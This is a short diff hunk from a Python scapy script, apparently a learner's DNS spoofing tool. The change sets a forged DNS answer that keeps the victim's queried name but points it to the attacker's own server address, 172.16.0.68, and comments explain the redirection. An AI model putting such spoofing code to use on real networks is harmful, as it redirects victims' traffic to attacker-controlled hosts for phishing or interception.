@@ -75,7 +75,7 @@ def process_packet(packet):
             
             #set awnser as new DNS reply. With rrname set as same 
             #as original DNS request BUT! rdata to our server ip  
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168....")
+            answer = scapy.DNSRR(rrname=qname, rdata="172.16.0.68")
             
             # modify pkt with our veriables answer and accout.
                 # ancount is modifide as web site could have multiple servers 
